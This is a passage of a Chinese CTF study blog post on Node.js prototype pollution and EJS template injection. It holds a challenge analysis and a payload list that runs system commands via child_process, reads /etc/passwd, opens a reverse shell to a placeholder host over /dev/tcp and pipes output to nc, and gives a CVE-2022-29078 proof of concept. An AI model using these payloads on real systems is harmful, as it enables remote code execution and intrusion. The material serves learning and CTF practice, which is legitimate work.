class="keyword">else</span> &#123;</span><br><span class="line">                target[key] = source[key];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们想象，当 <code>key</code> 为 <code>__proto__</code> 而 <code>source[key]</code> 又为你想要的原型链结果时，可以造成污染。</p>
+<p><strong>注意：我们在处理时对格式有着 <code>JSON</code> 的限制，那是因为字符串有可能直接覆盖掉原本原型的指向，反而指向一个其他的奇奇怪怪的东西而不指向 <code>Object</code>，造成原型链污染失败。</strong></p>
+<p>trick：用 <code>{&quot;constructor&quot;: {&quot;prototype&quot;: }</code> 一样可以污染原型链，相当于获取到了一个构造 object 的构造函数 function。</p>
+<p>也就是说：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]=objectname.<span class="property">__proto__</span>=objectname.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> = objectname[<span class="string">&quot;__pro&quot;</span>+<span class="string">&quot;to__&quot;</span>] = objectname[<span class="string">&quot;__pro&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;to__&quot;</span>)]</span><br></pre></td></tr></table></figure>
+
+<h3 id="浅析-proto-与-prototype"><a href="#浅析-proto-与-prototype" class="headerlink" title="浅析 __proto__ 与 prototype"></a>浅析 <code>__proto__</code> 与 <code>prototype</code></h3><p>nodejs 是面向对象编程的极佳体现，其中各种数据类型（包括函数）都可以看作是一种对象，而对象的顶端一般都是 object 也就是顶端的对象，下文结合一些例子看一下 <code>__proto__</code> 和 <code>prototype</code> 的区别。</p>
+<p><code>__proto__</code> 更注重是 类指向上一级类，比如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test = <span class="keyword">function</span> (<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125; <span class="comment">//Function.prototype 这里test -&gt; Function</span></span><br><span class="line">newtest = <span class="keyword">new</span> <span class="title function_">test</span>();<span class="comment">//test.prototype newtest -&gt; test</span></span><br><span class="line">qwq = &#123;&#125;;<span class="comment">//Object.prototype qwq -&gt; object</span></span><br><span class="line">a=<span class="number">8</span>;<span class="comment">//Number.prototype a -&gt; number</span></span><br></pre></td></tr></table></figure>
+
+<p>而 prototype 是只有函数具有的一种<strong>属性</strong>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">test = <span class="keyword">function</span> (<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;<span class="comment">//test.prototype 其实就是类似于自己的一种特性（准确来说是蓝图，他能定义函数的东西）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//example:</span></span><br><span class="line"></span><br><span class="line">test.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">qwq</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;123456&quot;</span>);&#125;<span class="comment">//正确</span></span><br><span class="line">test.<span class="property">qwq</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;123456&quot;</span>);&#125;<span class="comment">//错误</span></span><br><span class="line"></span><br><span class="line">a.<span class="title function_">qwq</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//同样它也可以通过 test.prototype.constructor 获取到函数本身</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span>==test);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这也就是为什么 objectname.__proto__=objectname.constrctor(构造 object 的东西 对于类来说相当于原形了一步).prototype</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20251028120126221.png" alt="image-20251028120126221"></p>
+<p>那么我们其实经常污染的就是 <strong>object.prototype</strong>。</p>
+<h3 id="一道巧妙的原型链污染例题"><a href="#一道巧妙的原型链污染例题" class="headerlink" title="一道巧妙的原型链污染例题"></a>一道巧妙的原型链污染例题</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18843">nodejs 原型链污染新视角-先知社区</a></p>
+<p>题目源码有点长，如下截取几个关键的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;  </span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;  </span><br><span class="line">  <span class="keyword">if</span> (users[username]) &#123;  </span><br><span class="line">    req.<span class="property">session</span>.<span class="property">errorMessage</span> = <span class="string">&#x27;User already exists!&#x27;</span>;  </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/register&#x27;</span>);  </span><br><span class="line">  &#125; </span><br><span class="line">    <span class="attr">password</span>: password,  </span><br><span class="line">    <span class="attr">isAdmin</span>: <span class="literal">false</span>,  </span><br><span class="line">    <span class="attr">themeConfig</span>: &#123;  </span><br><span class="line">      <span class="attr">theme</span>: &#123;  </span><br><span class="line">        <span class="attr">primaryColor</span>: <span class="string">&#x27;#6200EE&#x27;</span>,  </span><br><span class="line">        <span class="attr">secondaryColor</span>: <span class="string">&#x27;#03DAC6&#x27;</span>,  </span><br><span class="line">        <span class="attr">fontSize</span>: <span class="string">&#x27;16px&#x27;</span>,  </span><br><span class="line">        <span class="attr">fontFamily</span>: <span class="string">&#x27;Roboto, sans-serif&#x27;</span>  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;;</span><br><span class="line">         </span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;  </span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;  </span><br><span class="line">    <span class="keyword">const</span> user = users[username];  </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (user &amp;&amp; user.<span class="property">password</span> === password) &#123;  </span><br><span class="line">    req.<span class="property">session</span>.<span class="property">userId</span> = username;  </span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);  </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    req.<span class="property">session</span>.<span class="property">errorMessage</span> = <span class="string">&#x27;Invalid username or password&#x27;</span>;  </span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">parseQueryParams</span> = (<span class="params">queryString</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> queryString !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> cleanString = queryString.<span class="title function_">startsWith</span>(<span class="string">&#x27;?&#x27;</span>) ? queryString.<span class="title function_">substring</span>(<span class="number">1</span>) : queryString;</span><br><span class="line">  <span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(cleanString);</span><br><span class="line">  <span class="keyword">const</span> result = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> params.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">    <span class="keyword">const</span> path = key.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> current = result;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; path.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">let</span> part = path[i];</span><br><span class="line">      <span class="keyword">if</span>([<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>].<span class="title function_">includes</span>(part))&#123;</span><br><span class="line">        part = <span class="string">&#x27;__unsafe$&#x27;</span> + part;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (i === path.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">        current[part] = value;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!current[part] || <span class="keyword">typeof</span> current[part] !== <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">          current[part] = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current[part];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/theme&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = users[req.<span class="property">session</span>.<span class="property">userId</span>];</span><br><span class="line">  <span class="keyword">if</span> (!user) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> queryString = req.<span class="property">url</span>.<span class="title function_">split</span>(<span class="string">&#x27;?&#x27;</span>)[<span class="number">1</span>] || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> parsedUpdates = <span class="title function_">parseQueryParams</span>(queryString);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="title function_">keys</span>(parsedUpdates).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    user.<span class="property">themeConfig</span> = <span class="title function_">deepMerge</span>(user.<span class="property">themeConfig</span>, parsedUpdates);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running at http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Please register or login at http://localhost:3000/register or http://localhost:3000/login&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>首先审计一下嘛，你想要获得 <code>flag</code>，最后肯定要 <code>user[isadmin]=1 </code>，这很容易让我们想到原型链污染，但是定睛一看，一个用户再注册的时候他当前类的 <code>isadmin</code> 已经是 <code>0</code> 了，也就是说正常的污染，没用，因为他根本不会向上找。</p>
+<p>这个时候就再看看登陆的逻辑，可以发现要求 <code>user=users[username]</code> 存在并且，<code>user.password=input.password</code>，那我们可不可以直接让 <code>user</code> 等于一些底层的类似于构造方法的东西，<code>user</code> 没有就往 <code>object</code> 找，就找到了。然后 <code>user.password = input.password = undefined</code>，就过了登陆了。</p>
+<p>比如 <code>username=isPrototypeOf</code>，这样 <code>user</code> 存在并且 <code>user.password=input.password=undefined</code>。</p>
+<p>那么对于获得 <code>flag</code>，<code>users[&quot;isPrototypeOf&quot;].isAdmin</code>，显然 <code>  users</code> 没有 <code>isPrototypeOf</code> 这个属性，就会找 <code>object[&quot;isPrototypeOf&quot;].isAdmin</code>，那污染的时候同理，我们污染 <code>user[&quot;isPrototypeOf&quot;]</code> 的时候 <code>user</code> 也不存在这个属性，我们同样污染到了 <code>object</code>。</p>
+<h2 id="常见模板-Tricks"><a href="#常见模板-Tricks" class="headerlink" title="常见模板 Tricks"></a>常见模板 Tricks</h2><h3 id="EJS"><a href="#EJS" class="headerlink" title="EJS"></a>EJS</h3><h4 id="SSTI-1"><a href="#SSTI-1" class="headerlink" title="SSTI"></a>SSTI</h4><p><a target="_blank" rel="noopener" href="http://45.207.195.149/index.php/2025/12/15/node-js-ejs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti/">Node.js EJS模板注入SSTI – Acc1oFl4g’s Blog</a></p>
+<p>EJS 主要提供两种“标签”来嵌入 JavaScript 代码：</p>
+<ol>
+<li><strong><code>&lt;% ... %&gt;</code></strong>： 执行 JavaScript 代码（通常用于流程控制，如 if、for 循环）。</li>
+<li><strong><code>&lt;%= ... %&gt;</code></strong>： 执行 JavaScript 代码并将其结果 <strong>转义后</strong> 输出到 HTML 中。</li>
+<li><strong><code>&lt;%- ... %&gt;</code></strong>： 执行 JavaScript 代码并将其结果 <strong>不转义</strong> 地输出到 HTML 中。<strong>这是最危险的一个。</strong></li>
+</ol>
+<p>payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">const</span> fs = <span class="built_in">require</span>(‘fs’); <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(‘/etc/passwd<span class="string">&#x27;, &#x27;</span>utf8<span class="string">&#x27;); %&gt;&lt;%= data %&gt;</span></span><br><span class="line"><span class="string">&lt;%- global.process.mainModule.require(&#x27;</span>child_process<span class="string">&#x27;).execSync(&#x27;</span>id<span class="string">&#x27;) %&gt;</span></span><br><span class="line"><span class="string">&lt;%-</span></span><br><span class="line"><span class="string">global.process.mainModule.require(&#x27;</span>child_process<span class="string">&#x27;).spawnSync(&#x27;</span>env<span class="string">&#x27;).stdout.toStr</span></span><br><span class="line"><span class="string">ing() %&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> <span class="variable constant_">HTML</span> <span class="variable constant_">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Directory listing for &lt;%= path %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Directory listing for &lt;%= path %&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href=&quot;../&quot;&gt;../&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;% </span><br><span class="line">            const process = global.process || (() =&gt; &#123; </span><br><span class="line">                throw new Error(&#x27;No process&#x27;) </span><br><span class="line">            &#125;)(); </span><br><span class="line">        %&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;% </span><br><span class="line">            const result = process.mainModule.require(&#x27;child_process&#x27;)</span><br><span class="line">                .execSync(&#x27;/readflag&#x27;)</span><br><span class="line">                .toString(); </span><br><span class="line">        %&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;%= result %&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;% filenames.forEach(filename =&gt; &#123; %&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">                &lt;a href=&quot;&lt;%= encodeURIComponent(filename) %&gt;&quot;&gt;</span><br><span class="line">                    &lt;%= filename %&gt;</span><br><span class="line">                &lt;/a&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;% &#125;); %&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170">从 Lodash 原型链污染到模板 RCE-安全KER - 安全资讯平台</a></p>
+<h4 id="原型链污染-1"><a href="#原型链污染-1" class="headerlink" title="原型链污染"></a>原型链污染</h4><p>使用方法：[nodejs——ejs模版遇到原型链污染产生rce-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73756016/article/details/139814265?ops_request_misc=%7B%22request_id%22:%22b2d3f36a0c7d2c99173690797023219c%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=b2d3f36a0c7d2c99173690797023219c&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-139814265-null-null.142%5Ev102%5Epc_search_result_base8&utm_term=nodejs">https://blog.csdn.net/m0_73756016/article/details/139814265?ops_request_misc=%7B%22request%5Fid%22%3A%22b2d3f36a0c7d2c99173690797023219c%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=b2d3f36a0c7d2c99173690797023219c&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-139814265-null-null.142^v102^pc_search_result_base8&amp;utm_term=nodejs</a> ejs rce)</p>
+<p>详细原理：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170#h2-8">从 Lodash 原型链污染到模板 RCE-安全KER - 安全资讯平台</a></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/da0b2bafdced3e86a1fdb92ec51af5ec.png" alt="img"></p>
+<p>EJS 是一个 javascript 模板库，用来从 json 数据中生成HTML字符串，读取再渲染。</p>
+<p>而 ejs 在渲染的时候有大量代码拼接，然后我们通过原型链污染达到变量覆盖，就可以构造注入，先闭合上面的语句，再构造rce的语句，最后闭合好后买你。</p>
+<p>常见 Payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>outputFuncitonName字段：</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a=1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;); //&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>escapeFunction字段：</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;client&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;escapeFunction&quot;</span>: <span class="string">&quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;id | nc localhost 4444&#x27;)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;client&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="literal">true</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;client&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;debug&quot;</span>:<span class="literal">true</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>destructuredLocals字段：</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;destructuredLocals&quot;</span>:[<span class="string">&quot;a=a;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);//var __tmp2&quot;</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>localsName字段：</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;localsName&quot;</span>:<span class="string">&quot;x=global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span><span class="built_in">escape</span>字段：</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;client&quot;</span>:<span class="number">1</span>,<span class="string">&quot;escape&quot;</span>:<span class="string">&quot;escapeFn;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打 res.render(&#x27;index&#x27;, req.body);</span></span><br><span class="line"><span class="variable constant_">CVE</span>-<span class="number">2022</span>-<span class="number">29078</span>（ejs &lt;= v3<span class="number">.1</span><span class="number">.9</span>）</span><br><span class="line">参考：<span class="attr">https</span>:<span class="comment">//inhann.top/2023/03/26/ejs/</span></span><br><span class="line">例题：<span class="title class_">Geek</span>_Challenge_2023 - 雨</span><br><span class="line"></span><br><span class="line"><span class="attr">POC</span>:</span><br><span class="line">&#123;<span class="string">&quot;settings&quot;</span>:&#123;<span class="string">&quot;view options&quot;</span>:&#123;<span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;console.log;this.global.process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;touch /tmp/pwned\&quot;);&quot;</span>,<span class="string">&quot;client&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a>Jade</h3><p><img src="https://p2.ssl.qhimg.com/t0131c9444c12433d88.png" alt="img"></p>
